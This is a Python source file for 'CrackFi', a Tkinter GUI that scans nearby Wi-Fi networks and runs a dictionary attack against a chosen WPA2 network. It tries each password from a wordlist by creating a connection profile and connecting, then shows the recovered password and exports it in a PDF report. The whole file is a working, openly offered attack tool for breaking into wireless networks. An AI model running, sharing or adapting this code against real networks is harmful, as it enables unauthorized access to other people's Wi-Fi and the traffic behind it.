# -*- coding: utf-8 -*-
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from pywifi import PyWiFi, Profile, const
from termcolor import cprint
import operator
import time
import sys
import os
from tkinter import *
from PIL import Image, ImageTk
from reportlab.pdfgen import canvas

from reportlab.lib.pagesizes import letter
from datetime import datetime


class GUI:
    def __init__(self, root, interface_idx=0):
        self.root = root
        self.root.title("WiFi-Cracker")
        self.root.geometry("300x500")
        self.delta = tk.DoubleVar()
        self.target_var = tk.StringVar()
        self.password_var = tk.StringVar()
        self.wifi = PyWiFi()
        self.interfaces = self.wifi.interfaces()
        self.interface = self.interfaces[interface_idx]
        self.attempts = tk.IntVar()
        self.attempts.set(0)
        self.successful_attempts = 0
        self.unsuccessful_attempts = tk.IntVar()
        self.unsuccessful_attempts.set(0)
        self.delta.set(0.0)
        self.password1 = None
        self.pil_image = Image.open("logo1.png")
        self.color="white"

       # Resize the image
        #self.resized_image = self.pil_image.resize((200, 200), Image.ANTIALIAS)
        self.resized_image = self.pil_image.resize((200, 200),  Image.Resampling.LANCZOS)
       # Convert the resized image to PhotoImage
        self.image = ImageTk.PhotoImage(self.resized_image)
        self.interface_1_frame = tk.Frame(self.root)
        self.interface_2_frame = tk.Frame(self.root)
        self.interface_3_frame = tk.Frame(self.root)
        self.root.configure(background=self.color)
        self.interface_1_frame.configure(background="light gray")
        #self.interface_1_frame.geometry("300x500")

        self.interface_2_frame.configure(background="light gray")
        self.interface_3_frame.configure(background="light gray")

        self.create_interface_1()
        self.create_interface_2()
        self.create_interface_3()
        self.show_interface_1()

    def create_interface_1(self):
        image_label1 = tk.Label(self.interface_1_frame, image=self.image)
        image_label1.pack(anchor="nw", padx=10, pady=10 ,side="top")
                          
        label = tk.Label(self.interface_1_frame, text="Welcome to CrackFi", bg="light gray", fg="black", padx=10, pady=10 ,font=("Arial", 15))
        label.pack(padx=10, pady=10)

        button = tk.Button(self.interface_1_frame, text="Start", bg="light gray", fg="black", command=self.show_interface_2, padx=15, pady=5)
        button.pack(padx=15, pady=5)
       

    def create_interface_2(self):
        image_label2 = tk.Label(self.interface_2_frame, image=self.image)
        image_label2.pack(anchor="nw", padx=10, pady=10)

        label = tk.Label(self.interface_2_frame, text="Select WiFi Network:", bg="light gray", fg="black", padx=15, pady=5)
        label.pack(padx=15, pady=5)

        self.combo_box = ttk.Combobox(self.interface_2_frame, textvariable=self.target_var)
        self.combo_box.pack(side="top")

        scan_button = tk.Button(self.interface_2_frame, text="Scan", bg="light gray", fg="black", command=self.scan, padx=15, pady=5)
        scan_button.pack(padx=15, pady=5)

        password_label = tk.Label(self.interface_2_frame, text="Enter Password List Path:", bg="light gray", fg="black", padx=15, pady=5)
        password_label.pack(padx=15, pady=5)

        self.password_entry = tk.Entry(self.interface_2_frame, textvariable=self.password_var)
        self.password_entry.pack()

        browse_button = tk.Button(self.interface_2_frame, text="Browse", bg="light gray", fg="black", command=self.browse_password_list, padx=15, pady=5)
        browse_button.pack(padx=15, pady=5)

        crack_button = tk.Button(self.interface_2_frame, text="Crack", bg="light gray", fg="black", command=self.crack, padx=15, pady=5)
        crack_button.pack(padx=15, pady=5)

        report_button = tk.Button(self.interface_2_frame, text="Report", bg="light gray", fg="black", command=self.show_interface_3, padx=15, pady=5)
        report_button.pack(padx=15, pady=5)
       
    def create_interface_3(self):
        image_label = tk.Label(self.interface_3_frame, image=self.image)
        image_label.pack(anchor="nw", padx=10, pady=10)
        labe4 = tk.Label(self.interface_3_frame, text="Report", bg="light gray", fg="black", padx=10, pady=10 ,font=("SemiBold", 15))
        labe4.pack(padx=10, pady=10)
        labelun = tk.StringVar()
        labelun.set("Number of unsuccessful attempts:")
        numunlabel = tk.StringVar()
        numunlabel.set("num:")
        label = tk.Label(self.interface_3_frame, text="Interface 3", textvariable=labelun, bg="light gray", fg="black")
        label.pack()
        numunlabel = tk.Label(self.interface_3_frame, textvariable=self.unsuccessful_attempts, bg="light gray", fg="black")
        numunlabel.pack()
        atttextlabel = tk.StringVar()
        atttextlabel.set("Number of total attempts:")
        atttextlabel = tk.Label(self.interface_3_frame, textvariable=atttextlabel, bg="light gray", fg="black")
        atttextlabel.pack()
        attlabel = tk.Label(self.interface_3_frame, textvariable=self.attempts, bg="light gray", fg="black")
        attlabel.pack()
        timetext = tk.StringVar()
        timetext.set("The time for total attempts in seconds:")
        timetext = tk.Label(self.interface_3_frame, textvariable=timetext, bg="light gray", fg="black")
        timetext.pack()
        time_label = tk.Label(self.interface_3_frame, textvariable=self.delta, bg="light gray", fg="black")
        time_label.pack() 
        label = tk.Label(self.interface_3_frame, text="PDF copy of the report",bg="light gray", fg="black",padx=15, pady=5)
        label.pack(  padx=15 ,pady=5)
        Report_button = tk.Button(self.interface_3_frame, text="Export",bg="light gray", fg="black", command=self.pdf,  padx=15 ,pady=5)
        Report_button.pack(  padx=15 ,pady=5)
    def show_interface_1(self):
        self.interface_1_frame.pack()
        self.interface_2_frame.pack_forget()
        self.interface_3_frame.pack_forget()

    def show_interface_2(self):
        self.interface_1_frame.pack_forget()
        self.interface_2_frame.pack()
        self.interface_3_frame.pack_forget()

    def show_interface_3(self):
       self.interface_1_frame.pack_forget()
       self.interface_2_frame.pack_forget()
       self.interface_3_frame.pack()
    is_windows = (sys.platform == 'win32')
    colors = ['blue', 'red']

    def dictionary_attack(self, target, password_list_path):
        dictionary = self.load_dictionary(password_list_path)
        start_time = time.time()
        for password in dictionary:
            self.attempts.set(self.attempts.get() + 1)
           # color = self.colors[self.attempts % len(self.colors)]
            if self.test_wifi(target, password):
                testtime=time.time() - start_time
                self.delta.set(testtime)
                self.successful_attempts += 1
                self.beep()
                print('\n', format(' ', '-<30'), sep='')
                print("Password:", password)  # Add this line
                self.password1 = password
                
                cprint(f' PASSWORD: <{password}>')
                self.password = password
               # print(f' {self.attempts} attempts\n {self.unsuccessful_attempts} unsuccessful\n in {self.delta:.2f}s')
                print(format(' ', '-<30'))
                return password
            else:
                self.unsuccessful_attempts.set(self.unsuccessful_attempts.get()+1)
                print(f'Attempt {self.attempts} failed.')

    def test_wifi(self, ssid, password):
        self.interface.disconnect()
        profile = self.create_temp_profile(ssid, password)
        self.interface.add_network_profile(profile)
        self.interface.connect(profile)
        time.sleep(.7)
        if self.interface.status() == const.IFACE_CONNECTED:
            self.interface.remove_network_profile(profile)
            return True
        else:
            self.interface.remove_network_profile(profile)
            return False

    @staticmethod
    def create_temp_profile(ssid, password):
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        return profile

    def load_dictionary(self, dictionary_path):
        try:
            with open(dictionary_path, 'r', errors='ignore') as file:
                dictionary = file.read().splitlines()
            return dictionary
        except FileNotFoundError:
            messagebox.showerror("Error", "Password list not found.")
            return []

    def scan(self):
        self.interface.scan()
        time.sleep(2)
        networks = self.interface.scan_results()
        self.combo_box['values'] = [network.ssid for network in networks]
        self.combo_box.current(0)

    def browse_password_list(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        self.password_var.set(file_path)

    def crack(self):
        target = self.combo_box.get()
        password_list_path = self.password_var.get()

        if not target or not password_list_path:
            messagebox.showerror("Error", "Please select a WiFi network and password list.")
            return

        password = self.dictionary_attack(target, password_list_path)
        if password:
            messagebox.showinfo("Success", f"Password found: {password}")
        else:
            messagebox.showinfo("Failure", "Password not found.")

    def beep(self):
        if self.is_windows:
            import winsound
            winsound.Beep(500, 1000)
        else:
            sys.stdout.write('\a')
            sys.stdout.flush()
  
    def pdf(self):
       pdf = canvas.Canvas("Report.pdf", pagesize=letter)

       # Define the path to the image file
       image_path = "logo1.png"
       result = "REPORT"

       statement = "The cracked WiFi :"
       statement2 = "The Password  :"
       statement3 = "Number of total attempts:  "
       statement4="The time for total attempts in seconds:"
       statement5="Contact Information:"
       statement6="Email: CrackFi@hotamil.com"
       statement7="Phone Number: +966 0511111111"
      

       statement1="Crack Information"
       current_datetime = datetime.now()



       # Set the position and size of the image on the page
       width = 320
       height = 270
       current_date = datetime.now().date().strftime("%Y-%m-%d")
       current_day = current_datetime.strftime("%A")
       # Draw the image on the PDF
       pdf.drawImage(image_path, 150, 550, width, height)

       # Draw the date on the PDF
       pdf.setFont("Helvetica-Bold", 30)
       pdf.drawString(240, 540, result)
       pdf.setFont("Helvetica-Bold", 20)
       pdf.drawString(220, 420, statement1)

       pdf.setFont("Helvetica", 12)
       pdf.drawString(130, 500, current_date)
       pdf.drawString(80, 500, " Date:")
       pdf.drawString(130, 460, current_day)
       pdf.drawString(80, 460, " Day:")
       pdf.drawString(80, 380, statement)
       pdf.drawString(300, 380, self.target_var.get())
       pdf.drawString(80, 350, statement2)
       pdf.drawString(300, 350, self.password1)
       pdf.drawString(80, 320, statement3)
       pdf.drawString(300, 320, str(self.attempts.get()))
       pdf.drawString(80, 290, statement4)
       pdf.drawString(300, 290, str(self.delta.get()))
       pdf.drawString(50, 100, statement5)
       pdf.drawString(50, 70, statement6)
       pdf.drawString(50, 40, statement7)


       # Get the page dimensions
       page_width, page_height = letter

       # Set the border properties
       border_width = 2  # Width of the border (in points)
       border_color = "black"  # Color of the border

       # Draw a border around the entire page
       pdf.setStrokeColor(border_color)
       pdf.setLineWidth(border_width)
       pdf.rect(0, 0, page_width, page_height, stroke=True, fill=False)

       # Save and close the PDF
       pdf.save()
    


if __name__ == "__main__":
   
    print('''\n
   ____                    _     _____  _ 
  / ___| _ __  __ _   ___ | | __|  ___|(_)
 | |    | '_| / _` | / __|| |/ /| |    | |
 | |___ | |  | (|  ||  (_ |   < |  _|  | |
   ____||_|    __,_|  ___||_| _ |_|    |_|
                                  
    \n\n''')
    root = tk.Tk()
    root.configure(background="light gray")
    gui = GUI(root)
    root.mainloop()